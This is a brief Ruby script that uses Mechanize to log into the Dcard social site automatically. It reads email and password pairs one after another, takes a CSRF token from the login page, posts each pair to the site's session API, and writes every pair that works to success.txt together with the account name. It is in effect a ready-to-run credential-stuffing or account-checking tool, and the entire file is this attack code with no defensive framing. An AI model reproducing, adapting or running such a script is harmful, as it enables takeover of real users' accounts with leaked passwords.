# encoding: UTF-8
require 'rubygems'
require 'nokogiri'
require 'mechanize'


def getToken page
  tmp = page.search('script').text
  /csrfToken\":\"(.*)\",\"isLogin/ =~ tmp
  Regexp.last_match[1].strip
end

f = File.open('success.txt', 'w')

while true

  @agent = Mechanize.new
  input = gets.split(' ')

  page = @agent.get 'https://www.dcard.tw/login'
  token = getToken(page)
  
  id = input[0]
  pass = input[1]

#============Login=============
  request_url = 'https://www.dcard.tw/_api/sessions'
  body = "{\"email\":\"#{id}\",\"password\":\"#{pass}\"}"
  header = {'Content-Type' => 'application/json', 'Accept' => 'application/json', 'x-csrf-token' => token}


  begin
    page = @agent.post request_url, body, header
    page = @agent.get 'https://www.dcard.tw/my/collections'
    name = page.search('div.MyAvatar_name_1iAo4').text
    puts "#{name} #{id} #{pass}"
    f.write("#{name} #{id} #{pass}\n")
  rescue
    
  end
end
